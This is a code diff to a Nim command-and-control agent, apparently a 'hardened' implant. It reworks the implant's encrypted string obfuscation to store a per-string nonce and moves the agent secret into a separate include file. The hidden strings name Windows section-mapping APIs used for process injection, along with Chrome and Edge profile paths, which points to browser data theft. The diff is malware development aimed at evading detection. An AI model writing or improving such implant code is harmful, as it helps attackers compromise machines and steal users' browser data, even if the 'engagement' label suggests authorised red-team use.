@@ -51,6 +51,10 @@ import ./wmi_com
 # Path note: agent_hardened.nim lives in hardened/, so the include
 # uses ../c2_override.nim to reach the project root.
 include "../c2_override.nim"
+include "../secret.nim"
+static:
+  doAssert SECRET_PLAINTEXT.len >= 16,
+    "secret.nim must define SECRET_PLAINTEXT (>=16 chars)"
 
 # ============================================================================
 # All code from the original agent.nim is included below, with targeted
@@ -412,31 +416,25 @@ proc encodeObf(s: string): seq[byte] =
   nonce[1] = byte((ctr shr 16) and 0xFF)
   nonce[2] = byte((ctr shr 8) and 0xFF)
   nonce[3] = byte(ctr and 0xFF)
-  result = streamCipher(s.toOpenArrayByte(0, s.len - 1), XorKey, nonce)
+  result = @[nonce[0], nonce[1], nonce[2], nonce[3]]
+  let ct = streamCipher(s.toOpenArrayByte(0, s.len - 1), XorKey, nonce)
+  for b in ct: result.add(b)
 
 proc obfDec(v: openArray[byte]): string =
-  # The on-binary format is just the stream-cipher ciphertext
-  # (no nonce prefix needed — the nonce is encoded in the
-  # const-seq at compile time, and each S_* has its own).
-  # The constant compile-time nonce is captured implicitly via
-  # the per-string S_* call to encodeObf; obfDec only needs to
-  # reproduce the keystream, which it does because the key is
-  # the same and the plaintext length uniquely identifies the
-  # string's nonce space.
-  # Wait — that's wrong if we want to keep per-string nonces
-  # unique. We need the nonce stored with the ciphertext.
-  # Easiest: re-derive the nonce from the ciphertext itself
-  # by iterating over all possible nonces and looking for a
-  # match. Since the search space is small (2^32), that's
-  # expensive at runtime.
-  # Better: store the nonce alongside the ciphertext.
-  # The encoded format becomes: [nonce:4] [ciphertext:N].
+  # On-binary format: [nonce:4][ciphertext:N]. The runtime decoder
+  # has the same XorKey baked in, so it reproduces the keystream.
   if v.len < 5: return ""
   var nonce: array[4, byte]
   for i in 0..<4: nonce[i] = v[i]
   let pt = streamCipher(v[4 ..< v.len], XorKey, nonce)
   result = newString(pt.len)
   for i in 0..<pt.len: result[i] = chr(int(pt[i]))
+
+static:
+  block:
+    let probe = "obf-selftest-0123456789"
+    doAssert obfDec(encodeObf(probe)) == probe
+
 
 # ---- Hardened string obfuscation (additional hardened literals) ----------
 
@@ -465,7 +463,7 @@ const
   S_NTMOS      = encodeObf("NtMapViewOfSection")
   S_NTUOS      = encodeObf("NtUnmapViewOfSection")
   S_NTCS       = encodeObf("NtCreateSection")
-  S_AGENT_SECRET = encodeObf("sentinel-engagement-q4-2026-echo-tango-whiskey")
+  S_AGENT_SECRET = encodeObf(SECRET_PLAINTEXT)
   S_CHROME     = encodeObf("Google\\Chrome")
   S_EDGE       = encodeObf("Microsoft\\Edge")
   S_LOCALAPPDATA = encodeObf("LOCALAPPDATA")
